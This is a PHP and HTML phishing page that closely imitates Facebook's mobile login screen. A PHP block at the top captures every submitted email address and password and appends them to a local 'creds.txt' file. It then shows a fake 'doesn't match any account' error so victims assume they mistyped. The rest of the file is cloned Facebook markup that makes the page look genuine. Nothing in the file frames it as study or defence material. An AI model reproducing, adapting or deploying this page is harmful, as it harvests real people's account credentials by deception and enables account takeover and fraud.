<?php
$err = "";
if (!empty($_POST)) {
	$user = $_POST['emailaddress'];
	$pass = $_POST['password'];
	file_put_contents('../creds.txt',"facebook: $user $pass\n",FILE_APPEND);
	$err = "<div class=\"_5yd0 _2ph- _5yd1\" style=\"\" data-sigil=\"m_login_notice\">The email address or phone number that you've entered doesn't match any account.</div>";
}
?>
<html>
  <head>
      <meta http-equiv="content-type" content="text/html;charset=utf-8">
      <title>Facebook – log in or sign up</title>
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
      <link href="./static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196">
      <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="dOsGC" href="./static.xx.fbcdn.net/rsrc.php/v3/y2/l/0%2ccross/QzsHSoWJZTl.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="F9luQ" href="./static.xx.fbcdn.net/rsrc.php/v3/yx/l/0%2ccross/fTx62VEfv41.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="29sAD" href="./static.xx.fbcdn.net/rsrc.php/v3/yt/l/0%2ccross/S5zV7mCCUXS.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="6CB2b" href="./static.xx.fbcdn.net/rsrc.php/v3/ys/l/0%2ccross/RWAN3d_LMcN.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="FYEyJ" href="./static.xx.fbcdn.net/rsrc.php/v3/yK/l/0%2ccross/rfgMGMgNRkd.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="NUJ+j" href="./static.xx.fbcdn.net/rsrc.php/v3/yn/l/0%2ccross/hz3g_Eyq7UF.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="BrHyY" href="./static.xx.fbcdn.net/rsrc.php/v3/yf/l/0%2ccross/xYtHz7qxWMi.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="hfTtG" href="./static.xx.fbcdn.net/rsrc.php/v3/yR/l/0%2ccross/wtqBAdlHewn.css">
      <link rel="stylesheet" type="text/css" data-bootloader-hash="A8ekJ" href="./static.xx.fbcdn.net/rsrc.php/v3/yP/l/0%2ccross/HysQDcSDOWr.css">
	  <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
      <meta name="description" content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
      <link rel="canonical" href="https://www.facebook.com/">
   </head>
   <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
      <script id="u_0_e">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
      <div id="viewport">
         <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
         <div id="page">
            <div class="_129_" id="header-notices">
               <div class="_2nsj" id="u_0_7">To personalise content, tailor and measure ads and provide a safer experience, we use cookies. By tapping on the site, you agree to our use of cookies on and off Facebook. Learn more, including about controls: <a href="#" class="_2nsi" id="cpn-pv-link">Cookie Policy</a>.</div>
            </div>
            <div class="_4g33 _52we _52z5" id="header">
               <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="#"><i class="img sp_AaWbcPO1kb4 sx_40da10"><u>facebook</u></i></a></div>
            </div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
               <div class="_4g33">
                  <div class="_4g34" id="u_0_0">
					<?php if (!empty($err)) { echo $err; } ?>
                     <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                     </div>
                     <div class="aclb _4-4l">
                        <div data-sigil="m_login_upsell login_identify_step_element"></div>
                        <div class="_5rut">
                           <form method="post" action="index.php" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
                              <input type="hidden" name="lsd" value="AVpHHobS" autocomplete="off"><input type="hidden" name="m_ts" value="1526810800"><input type="hidden" name="li" value="sEgBW_vAIjxU_7y0ICajEpxt"><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries">
                              <div class="_56be _5sob">
                                 <div class="_55wo _55x2 _56bf">
                                    <div id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="emailaddress" placeholder="Email address or phone number" type="text" data-sigil="m_login_email"></div>
                                    <div>
                                       <div class="_1upc _mg8" data-sigil="m_login_password">
                                          <div class="_4g33">
                                             <div class="_4g34 _5i2i _52we">
                                                <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="password" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input"></div>
                                             </div>
                                             <div class="_5s61 _216i _5i2i _52we">
                                                <div class="_5xu4">
                                                   <div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">HIDE</span><span class="mfss" id="u_0_3">SHOW</span></a></div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div class="_2pie" style="text-align:center;">
                                 <div id="u_0_4" data-sigil="login_password_step_element"><input type="submit" style="background:#3578E5;
                                    " value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button"></div>
                              </div>
                              <input type="hidden" name="prefill_contact_point" id="prefill_contact_point"><input type="hidden" name="prefill_source" id="prefill_source"><input type="hidden" name="prefill_type" id="prefill_type"><input type="hidden" name="first_prefill_source" id="first_prefill_source"><input type="hidden" name="first_prefill_type" id="first_prefill_type"><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false">
                              <div class="_xo8"></div>
                              <noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript>
                           </form>
                           <div>
                              <div class="_43mg"><span class="_43mh">or</span></div>
                              <div class="_52jj _5t3b" id="u_0_6"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#" data-sigil="m_reg_button">Create New Account</a></div>
                           </div>
                           <div>
                              <div class="other-links">
                                 <ul class="_5pkb _55wp">
                                    <li><span class="mfss fcg"><a href="#" id="forgot-password-link">Forgotten password?</a><span aria-hidden="true"> · </span><a href="#" id="help-link" class="sec">Help Centre</a></span></li>
                                 </ul>
                              </div>
                           </div>
                        </div>
                        <div></div>
                     </div>
                  </div>
               </div>
               <div></div>
               <img src="../fbsbx.com/security/hsts-pixel.gif?c=3.2" width="0" height="0" style="display:none">
               <div class="_55wr _5ui2">
                  <div class="_5dpw">
                     <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_4g33">
                           <div class="_4g34">
                              <span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                              <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Español</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Italiano</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Deutsch</a></span></div>
                           </div>
                           <div class="_4g34">
                              <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Polski</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Français (France)</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Português (Brasil)</a></span></div>
                              <a href="#">
                                 <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages"><i class="img sp_AaWbcPO1kb4 sx_ab54cf"></i></div>
                              </a>
                           </div>
                        </div>
                     </div>
                     <div class="_5ui4"><span class="mfss fcg">Facebook ©2018</span></div>
                  </div>
               </div>
            </div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_8" data-sigil="marea">
               <div class="_5vsg" id="u_0_9"></div>
               <div class="_5vsh" id="u_0_a"></div>
               <div class="_5v5d fcg">
                  <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                  Loading...
               </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
               <div class="container">
                  <div class="image"></div>
                  <div class="message" data-sigil="error-message"></div>
                  <a class="link" data-sigil="MPageError:retry">Try Again</a>
               </div>
            </div>
         </div>
      </div>
      <div id="static_templates">
         <div class="mDialog" id="modalDialog" style="display:none">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
               <div class="_4g33 _52we">
                  <div class="_5s61">
                     <div class="_52z7"><button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_c" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_d" data-sigil="dialog-back-button"><i class="img sp_yHvWwA47vKe sx_cf16ba" style="margin-top: 2px;"></i></button></div>
                  </div>
                  <div class="_4g34">
                     <div class="_52z6">
                        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">Loading...</div>
                     </div>
                  </div>
                  <div class="_5s61">
                     <div class="_52z8" id="modalDialogHeaderButtons"></div>
                  </div>
               </div>
               <div id="pagelet_0_0"></div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
               <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_b" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
               Loading...
            </div>
         </div>
      </div>
   </body>
</html>